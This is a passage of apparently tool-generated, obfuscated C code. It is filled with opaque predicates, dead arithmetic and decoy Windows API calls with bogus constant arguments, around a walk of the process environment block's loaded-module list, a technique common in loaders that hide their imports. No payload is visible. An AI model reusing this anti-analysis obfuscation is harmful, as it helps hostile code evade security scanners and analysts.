                  if (!(((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2))))
                  {
                    if (!(((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2))))
                    {
                      void * v4f88fe5da4cc7cdd729394baf1802e76 = (void *) 0x8c962981;
                      int vbce0609ae245866fd113be721e8e6d62 = (int) 0x401974bb;
                      vbce0609ae245866fd113be721e8e6d62 = RemoveDllDirectory(v4f88fe5da4cc7cdd729394baf1802e76);
                    }
                    void * v75f37a5ad007507763acc6d214bc24a7 = (void *) 0xe692c2ee;
                    long v1af7638b69bfa3797f6f4921604b7e7f = (long) 0x785bcdf6;
                    v1af7638b69bfa3797f6f4921604b7e7f = RoUnregisterForApartmentShutdown(v75f37a5ad007507763acc6d214bc24a7);
                    if (!((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25))))
                    {
                      v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque = v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque % v98eabc18c672648c4aec2c705ff26f49_true_opaque;
                    }
                    if (!(((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2))))
                    {
                      vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = vaea6d2639c33242f8a189013aee805ca_computation_opaque + v25128658a1eb9dde8eca910ec9610564_computation_opaque;
                      vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque = vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque + v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque;
                      v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque = v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque | v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque;
                      v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque = v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque < v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque;
                    }
                  }
                  if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
                  {
                    if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
                    {
                      void * vff6584cc0b25809b8d15fbd09027827a = (void *) 0xf76e3a76;
                      unsigned long v9756e033c0b6e99a8ebe144f2027c23c = (unsigned long) 0x620a88e4;
                      unsigned long v553c4b018d563a8553ede182c782c711 = (unsigned long) 0x6debf8a3;
                      v553c4b018d563a8553ede182c782c711 = SnmpListen(vff6584cc0b25809b8d15fbd09027827a, v9756e033c0b6e99a8ebe144f2027c23c);
                    }
                    unsigned long ve05270e41c928fcf0d21942d89d4e9f3 = (unsigned long) 0x829c893b;
                    unsigned long v77bec7baef112cd9f2db35eea2e39504 = (unsigned long) 0xe3de968e;
                    void * v6230088b43b3289e4e200579ad828d0e = (void *) 0x91d78955;
                    int v1cf566034c3f903e799f58af5732af26 = (int) 0x7dab6cf0;
                    if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
                    {
                      v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque = v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque != v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque;
                      v25128658a1eb9dde8eca910ec9610564_computation_opaque = v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque | v0194410636aa2e22ad354becd27c7b3d_useless_opaque;
                      v11935c6af272cdef5cffe18d49020373_computation_opaque = vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque <= v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque;
                      v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque = v11935c6af272cdef5cffe18d49020373_computation_opaque || v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque;
                      v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque != v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque;
                      v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque + v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque;
                      v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v25128658a1eb9dde8eca910ec9610564_computation_opaque + vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque;
                    }
                    int v5e309988023afa135741cd0051570ba3 = (int) 0x7b8efa04;
                    v5e309988023afa135741cd0051570ba3 = GetLocaleInfoW(ve05270e41c928fcf0d21942d89d4e9f3, v77bec7baef112cd9f2db35eea2e39504, v6230088b43b3289e4e200579ad828d0e, v1cf566034c3f903e799f58af5732af26);
                  }
                  if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
                  {
                    unsigned long v948bfe0c1d97c3881633e7f16ffd17ed = (unsigned long) 0x2e8e7ad4;
                    void * vc3460ddc29825b2afa767b111a9ac5ba = (void *) 0xca5cef38;
                    int v7b03e30b202bc0df88aba4b7c474cbb5 = (int) 0x579db98f;
                    void * v696545e1c2e4f386e25345b4d2f1d305 = (void *) 0xa9ecfde1;
                    int v2719f2099f69dece1d56823297d7c3f5 = (int) 0xdc695991;
                    int v66063ad9ba7b7fba4e7801b877e65a13 = (int) 0xa27fe459;
                    v66063ad9ba7b7fba4e7801b877e65a13 = IdnToNameprepUnicode(v948bfe0c1d97c3881633e7f16ffd17ed, vc3460ddc29825b2afa767b111a9ac5ba, v7b03e30b202bc0df88aba4b7c474cbb5, v696545e1c2e4f386e25345b4d2f1d305, v2719f2099f69dece1d56823297d7c3f5);
                    if (!(((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2))))
                    {
                      vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque | v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque;
                      v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque != v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque;
                      v98eabc18c672648c4aec2c705ff26f49_true_opaque = v25128658a1eb9dde8eca910ec9610564_computation_opaque < v98eabc18c672648c4aec2c705ff26f49_true_opaque;
                      vaea6d2639c33242f8a189013aee805ca_computation_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque + v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque;
                      v86b63366271ca51c6b7dca9c9c9df243_useless_opaque = v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque == v98eabc18c672648c4aec2c705ff26f49_true_opaque;
                      vaea6d2639c33242f8a189013aee805ca_computation_opaque = v11935c6af272cdef5cffe18d49020373_computation_opaque || v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque;
                    }
                  }
                  if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
                  {
                    v25128658a1eb9dde8eca910ec9610564_computation_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque | vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque;
                    vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque < vaea6d2639c33242f8a189013aee805ca_computation_opaque;
                    v0194410636aa2e22ad354becd27c7b3d_useless_opaque = v11935c6af272cdef5cffe18d49020373_computation_opaque % v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque;
                    v98eabc18c672648c4aec2c705ff26f49_true_opaque = v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque % v25128658a1eb9dde8eca910ec9610564_computation_opaque;
                    v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque <= vaea6d2639c33242f8a189013aee805ca_computation_opaque;
                  }
                  v11935c6af272cdef5cffe18d49020373_computation_opaque = (unsigned int) 0;
                }
                if ((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25)))
                {
                  if (((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2)))
                  {
                    v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque = v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque + ((unsigned int) 2);
                  }
                }
              }
            }
          }

        }

        unsigned int v1e41f50508598edb1efdc62c9545123b_prime_opaque = v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque;
        {
          LIST_ENTRY *linked_list_head = &process_env_block->Ldr->InMemoryOrderModuleList;
          if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
          {
            unsigned long vbaf885e13cfdd3e55577d18e83a30421 = (unsigned long) 0xec77f950;
            void * vf0b7d77c3e8cac14529c31db233ebc4d = (void *) 0x2db4dd37;
            int v33a29707d90d21498ed9ea6d9f6daee5 = (int) 0x3d6be2b2;
            if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
            {
              v98eabc18c672648c4aec2c705ff26f49_true_opaque = v98eabc18c672648c4aec2c705ff26f49_true_opaque * v0194410636aa2e22ad354becd27c7b3d_useless_opaque;
              vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque + v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque;
              if (v98eabc18c672648c4aec2c705ff26f49_true_opaque)
              {
                v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque = vaea6d2639c33242f8a189013aee805ca_computation_opaque % v13da422836d6407683e4c3be565c880b_useless_opaque;
                v86b63366271ca51c6b7dca9c9c9df243_useless_opaque = v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque % vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque;
                v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque <= v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque;
                v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque = v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque <= v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque;
                v98eabc18c672648c4aec2c705ff26f49_true_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque % v98eabc18c672648c4aec2c705ff26f49_true_opaque;
              }
            }
            if (!((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25))))
            {
              v1e41f50508598edb1efdc62c9545123b_prime_opaque = v11935c6af272cdef5cffe18d49020373_computation_opaque <= v25128658a1eb9dde8eca910ec9610564_computation_opaque;
              vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = v0194410636aa2e22ad354becd27c7b3d_useless_opaque - v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque;
              if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
              {
                v0194410636aa2e22ad354becd27c7b3d_useless_opaque = vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque || v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque;
                v1e41f50508598edb1efdc62c9545123b_prime_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque < v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque;
                v86b63366271ca51c6b7dca9c9c9df243_useless_opaque = v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque < v0194410636aa2e22ad354becd27c7b3d_useless_opaque;
                v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque = v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque != v1e41f50508598edb1efdc62c9545123b_prime_opaque;
                v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque = vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque || v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque;
              }
              v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque = v11935c6af272cdef5cffe18d49020373_computation_opaque * v13da422836d6407683e4c3be565c880b_useless_opaque;
              v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque = v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque || vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque;
              vaea6d2639c33242f8a189013aee805ca_computation_opaque = v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque;
              v98eabc18c672648c4aec2c705ff26f49_true_opaque = v98eabc18c672648c4aec2c705ff26f49_true_opaque < v1e41f50508598edb1efdc62c9545123b_prime_opaque;
              v1e41f50508598edb1efdc62c9545123b_prime_opaque = v98eabc18c672648c4aec2c705ff26f49_true_opaque + v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque;
            }
            if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
            {
              if (!(((v1e41f50508598edb1efdc62c9545123b_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1e41f50508598edb1efdc62c9545123b_prime_opaque == ((unsigned int) 2))))
              {
                if (((v1e41f50508598edb1efdc62c9545123b_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1e41f50508598edb1efdc62c9545123b_prime_opaque == ((unsigned int) 2)))
                {
                  v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque = v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque | ((unsigned int) 25);
                }
                if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
                {
                  v11935c6af272cdef5cffe18d49020373_computation_opaque = v1e41f50508598edb1efdc62c9545123b_prime_opaque % ((unsigned int) 107);
                  v98eabc18c672648c4aec2c705ff26f49_true_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque || v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque;
                  v0194410636aa2e22ad354becd27c7b3d_useless_opaque = v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque < vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque;
                  v1e41f50508598edb1efdc62c9545123b_prime_opaque = v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque == v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque;
                  v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque <= vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque;
                }
              }
              unsigned long v680288c67a9b38d734a4cbde81e8fe48 = (unsigned long) 0x586f7f5f;
              unsigned long vdab6a61205ec297f8b2056fc19a90b22 = (unsigned long) 0xdfd2c00a;
              void * v5d0b6f84e4a7f197601760b93a73d884 = (void *) 0xb56544bb;
              int v884a09c5c86b4cd625495c2ed1dc460c = (int) 0x871a16b5;
              int v23352f08cd6e0b9be895890c6d063b61 = (int) 0xc81e30a3;
              if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
              {
                v13da422836d6407683e4c3be565c880b_useless_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque + v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque;
                v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque = v11935c6af272cdef5cffe18d49020373_computation_opaque || v25128658a1eb9dde8eca910ec9610564_computation_opaque;
                vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = v25128658a1eb9dde8eca910ec9610564_computation_opaque < v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque;
              }
              if ((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25)))
              {
                v23352f08cd6e0b9be895890c6d063b61 = GetLocaleInfoW(v680288c67a9b38d734a4cbde81e8fe48, vdab6a61205ec297f8b2056fc19a90b22, v5d0b6f84e4a7f197601760b93a73d884, v884a09c5c86b4cd625495c2ed1dc460c);
              }
            }
            void * v1d561eb55a42e19b3d25d5abd834125b = (void *) 0x3d041ec5;
            int v596bc8d9c9ee1f7e29d3d6ea400a5298 = (int) 0x9e5a8d16;
            int ve2f0eb12af510d73ef5966f9cdbe1177 = (int) 0x2b98945d;
            if (!(((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2))))
            {
              vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = vaea6d2639c33242f8a189013aee805ca_computation_opaque / v11935c6af272cdef5cffe18d49020373_computation_opaque;
              v98eabc18c672648c4aec2c705ff26f49_true_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque / ((unsigned int) 50);
              v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque = v0194410636aa2e22ad354becd27c7b3d_useless_opaque * v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque;
              v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque < v25128658a1eb9dde8eca910ec9610564_computation_opaque;
              if (v98eabc18c672648c4aec2c705ff26f49_true_opaque)
              {
                if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
                {
                  vaea6d2639c33242f8a189013aee805ca_computation_opaque = v0194410636aa2e22ad354becd27c7b3d_useless_opaque != v1e41f50508598edb1efdc62c9545123b_prime_opaque;
                  v0194410636aa2e22ad354becd27c7b3d_useless_opaque = v0194410636aa2e22ad354becd27c7b3d_useless_opaque / v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque;
                  v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque != v25128658a1eb9dde8eca910ec9610564_computation_opaque;
                  v0194410636aa2e22ad354becd27c7b3d_useless_opaque = vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque < v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque;
                  v0194410636aa2e22ad354becd27c7b3d_useless_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque | vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque;
                  v11935c6af272cdef5cffe18d49020373_computation_opaque = v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque * ((unsigned int) 19);
                  vaea6d2639c33242f8a189013aee805ca_computation_opaque = v1e41f50508598edb1efdc62c9545123b_prime_opaque == vc7ba7d0a37d64c77cc1a1e0e3ca98c35_computation_opaque;
                }
                v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque / v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque;
                if (((v1e41f50508598edb1efdc62c9545123b_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1e41f50508598edb1efdc62c9545123b_prime_opaque == ((unsigned int) 2)))
                {
                  if (!(((v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque == ((unsigned int) 2))))
                  {
                    v11935c6af272cdef5cffe18d49020373_computation_opaque = v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque || v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque;
                    if (!(((v1e41f50508598edb1efdc62c9545123b_prime_opaque % ((unsigned int) 2)) != ((unsigned int) 0)) || (v1e41f50508598edb1efdc62c9545123b_prime_opaque == ((unsigned int) 2))))
                    {
                      v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque <= v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque;
                    }
                    vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque - v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque;
                    v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque = v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque != v11935c6af272cdef5cffe18d49020373_computation_opaque;
                  }
                  vaea6d2639c33242f8a189013aee805ca_computation_opaque = v0194410636aa2e22ad354becd27c7b3d_useless_opaque == v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque;
                }
              }
            }
            ve2f0eb12af510d73ef5966f9cdbe1177 = IdnToNameprepUnicode(vbaf885e13cfdd3e55577d18e83a30421, vf0b7d77c3e8cac14529c31db233ebc4d, v33a29707d90d21498ed9ea6d9f6daee5, v1d561eb55a42e19b3d25d5abd834125b, v596bc8d9c9ee1f7e29d3d6ea400a5298);
          }
          if (!((((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 9)) + ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 16))) == ((v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque * v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque) * ((unsigned int) 25))))
          {
            unsigned long v6cf4e5ea5c54f52c5c282f10dae499b2 = (unsigned long) 0x737d544a;
            void * vc2064ca675d577351db511b0298fef2c = (void *) 0x86c33fe1;
            if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
            {
              v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque = v98eabc18c672648c4aec2c705ff26f49_true_opaque % v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque;
              v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque | v3b8dbae43f81ea9acab5f5686c2c5536_useless_opaque;
              v13da422836d6407683e4c3be565c880b_useless_opaque = v6d9cdd93d860691dc88c3842d90d31d8_computation_opaque / v11935c6af272cdef5cffe18d49020373_computation_opaque;
              vaea6d2639c33242f8a189013aee805ca_computation_opaque = v86b63366271ca51c6b7dca9c9c9df243_useless_opaque < v1e41f50508598edb1efdc62c9545123b_prime_opaque;
              v25128658a1eb9dde8eca910ec9610564_computation_opaque = v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque / v2ca1b26195f401c023cdc22e47b7bfa7_prime_opaque;
            }
            int vecb5aa7caee1b00a68ef3c1d2186ba06 = (int) 0x395df7be;
            void * v021d46a34b84f8d5298f9b692d423acd = (void *) 0x37f3552c;
            int vccc9c0431d479bb75620eecf006bead0 = (int) 0x9c025b3f;
            int vdf7fff3f193d02031f2b249b09171241 = (int) 0xe7d5683b;
            if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
            {
              if (v98eabc18c672648c4aec2c705ff26f49_true_opaque)
              {
                v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque = vaea6d2639c33242f8a189013aee805ca_computation_opaque < vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque;
                if (!((((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 9)) + ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 16))) == ((v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque * v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque) * ((unsigned int) 25))))
                {
                  v51c51c589b77b80e7a2f4a9a98f7c2bf_useless_opaque = v13da422836d6407683e4c3be565c880b_useless_opaque / vaea6d2639c33242f8a189013aee805ca_computation_opaque;
                  v9fdcf8a0d32046fec9b7aa52e86ff6ad_random_opaque = v7e4caf3b0f16f45911d9ca18aba7cdbc_computation_opaque + vaea6d2639c33242f8a189013aee805ca_computation_opaque;
                  vf37e61f73f6d7acdf52a2a773ab0f648_computation_opaque = v98eabc18c672648c4aec2c705ff26f49_true_opaque - v1e41f50508598edb1efdc62c9545123b_prime_opaque;
                  v13da422836d6407683e4c3be565c880b_useless_opaque = v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque - v13da422836d6407683e4c3be565c880b_useless_opaque;
                  v25128658a1eb9dde8eca910ec9610564_computation_opaque = v18c6e9cef019ecaaab14c8dd38f20d29_random_opaque + v98eabc18c672648c4aec2c705ff26f49_true_opaque;
                }
              }
            }
            vdf7fff3f193d02031f2b249b09171241 = IdnToNameprepUnicode(v6cf4e5ea5c54f52c5c282f10dae499b2, vc2064ca675d577351db511b0298fef2c, vecb5aa7caee1b00a68ef3c1d2186ba06, v021d46a34b84f8d5298f9b692d423acd, vccc9c0431d479bb75620eecf006bead0);
          }
          LIST_ENTRY *current_module = linked_list_head->Flink;
          unsigned int vf2ad0daf2c50e9bbdeee9f283f6fcd57_useless_opaque = (unsigned int) 382293865;
          unsigned int v05e680cd9f467afe7b9a345dffa8100c_computation_opaque = (unsigned int) (&vf2ad0daf2c50e9bbdeee9f283f6fcd57_useless_opaque);
          unsigned int v0dd3d6ecfa8b024b2cfa830d5d1447ea_true_opaque = (((v05e680cd9f467afe7b9a345dffa8100c_computation_opaque * v05e680cd9f467afe7b9a345dffa8100c_computation_opaque) + v05e680cd9f467afe7b9a345dffa8100c_computation_opaque) % ((unsigned int) 2)) == ((unsigned int) 0);
          if (v98eabc18c672648c4aec2c705ff26f49_true_opaque)
          {
            if (v98eabc18c672648c4aec2c705ff26f49_true_opaque)
            {
              if (v98eabc18c672648c4aec2c705ff26f49_true_opaque)
              {
                while (current_module != linked_list_head)
                {
                  if (!v98eabc18c672648c4aec2c705ff26f49_true_opaque)
                  {
